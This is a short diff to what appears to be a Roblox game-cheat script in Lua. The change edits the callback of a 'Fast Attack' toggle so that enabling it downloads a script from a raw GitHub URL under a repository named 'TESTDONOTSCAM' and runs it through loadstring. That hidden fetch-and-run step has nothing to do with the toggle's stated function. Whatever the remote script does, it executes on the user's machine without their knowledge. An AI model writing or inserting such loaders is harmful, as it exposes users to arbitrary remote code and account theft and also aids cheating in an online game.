@@ -4846,6 +4846,9 @@ MIo = {"0", "0.2", "0.15", "0.155", "0.16", "0.165", "0.17", "0.175", "0.18", "0
 
 Setting:Toggle("Fast Attack",_G.ColorSetting,true,function(vu)
 	_G.FastAttack = vu
+	if _G.FastAttack == true then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/TESTDONOTSCAM/Script/main/ScriptBlox'))()
+	end
 end)
 
 require(game.ReplicatedStorage.Util.CameraShaker):Stop()
